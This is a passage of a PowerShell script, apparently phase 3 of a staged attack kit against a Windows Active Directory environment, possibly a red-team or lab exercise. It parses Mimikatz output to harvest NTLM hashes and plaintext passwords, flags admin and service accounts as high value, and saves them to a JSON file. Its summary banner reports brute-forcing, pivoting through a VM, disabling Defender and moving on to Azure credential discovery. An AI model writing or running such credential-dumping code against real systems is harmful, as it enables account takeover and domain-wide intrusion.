            $username = $usernameMatch.Groups[1].Value
            $domain = if ($domainMatch.Success) { $domainMatch.Groups[1].Value } else { "UNKNOWN" }
            $ntlm = $ntlmMatch.Groups[1].Value
            $password = if ($passwordMatch.Success) { $passwordMatch.Groups[1].Value.Trim() } else { "" }

            if ($ntlm -ne "00000000000000000000000000000000" -and
                $username -notmatch '\$$' -and
                $domain -notin @("NT AUTHORITY", "Font Driver Host", "Window Manager")) {

                $global:extractedCredentials += [PSCustomObject]@{
                    User = $username
                    Domain = $domain
                    NTLM = $ntlm
                    Password = $password
                    Level = if ($username -match "admin|administrator|svc") { "HIGH" } else { "MEDIUM" }
                }
            }
        }
    }

    $global:extractedCredentials = $global:extractedCredentials | Sort-Object -Property User, Domain -Unique

    if ($global:extractedCredentials.Count -gt 0) {
        Write-Host "  ✓ Extracted credentials: $($global:extractedCredentials.Count) items" -ForegroundColor Green

        foreach ($cred in $global:extractedCredentials) {
            $color = if ($cred.Level -eq "HIGH") { "Red" } else { "Yellow" }

            Write-Host "`n  [$($cred.Level)] $($cred.Domain)\$($cred.User)" -ForegroundColor $color
            Write-Host "    NTLM: $($cred.NTLM)" -ForegroundColor Gray

            if ($cred.Password -and $cred.Password -ne "(null)") {
                Write-Host "    Password: $($cred.Password)" -ForegroundColor Red
            }
        }

        $global:extractedCredentials | ConvertTo-Json | Out-File "$global:logPath\phase3_extracted_credentials.json"
    }
}

# Close session
if ($session -and ($session.GetType().Name -eq 'PSSession')) {
    Remove-PSSession -Session $session -ErrorAction SilentlyContinue
}

# Defender re-enablement will be performed in Phase 8

# Summary
Write-Host "`n" -NoNewline
Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              PHASE 3 SUMMARY                               ║
╟────────────────────────────────────────────────────────────╢
║ Attack Path: $(if($useVMPivot){"mjarvismaster → vmjarvisfe → AD"}else{"mjarvismaster → AD (Direct)"})
║ Pivot Used: $(if($useVMPivot){"✓ vmjarvisfe"}else{"✗ Direct Attack"})
║
║ Brute Force: $(if($validCredential){"✓ Success"}else{"✗ Failed"})
║ Acquired Credentials: $($validCredential.Username)
║
║ Mimikatz: $(if($mimikatzOutput){"✓ Executed"}else{"✗ Failed"})
║ Extracted Credentials: $($global:extractedCredentials.Count) items
║ High-Value: $(($global:extractedCredentials | Where-Object {$_.Level -eq "HIGH"}).Count) items
║
║ Next Step: Phase 4 (Azure Credential Discovery)
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Green

Write-Host "`n[PHASE 3] Complete - Proceed to Phase 4`n" -ForegroundColor Green